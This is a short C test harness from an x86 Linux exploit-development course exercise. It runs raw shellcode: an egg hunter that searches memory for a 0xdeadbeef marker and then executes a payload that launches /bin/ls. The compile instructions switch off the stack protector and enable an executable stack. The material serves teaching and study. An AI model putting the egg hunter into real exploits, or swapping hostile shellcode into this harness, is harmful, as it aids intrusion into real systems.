//#######################################
// Filename: EggHunter-Wrapper.c
// Author  : Andrea Perfetti
// SLAE ID : SLAE - 1547
//:::::::::::::::::::::::::::::::::::::::
// USAGE
// Add the shellcode (following the skeleton) in the 'shellcode[]' variable
// Compile with the following command (example file name):   
//   gcc -fno-stack-protector -z execstack -o test test.c
//########################################

#include<stdio.h>
#include<string.h>

void main()
{
        unsigned char shellcode[] = "\xef\xbe\xad\xde\xef\xbe\xad\xde\x31\xc0\x50\x68\x2f\x2f\x6c\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

	unsigned char egghunter[] = "\x90\x31\xc9\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8\xef\xbe\xad\xde\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";


	printf("Shellcode Length: %d\n", strlen(shellcode));
	printf("EggHunter Length: %d\n", strlen(egghunter));
	
	int (*ret)() = (int(*)())egghunter;
	ret();
}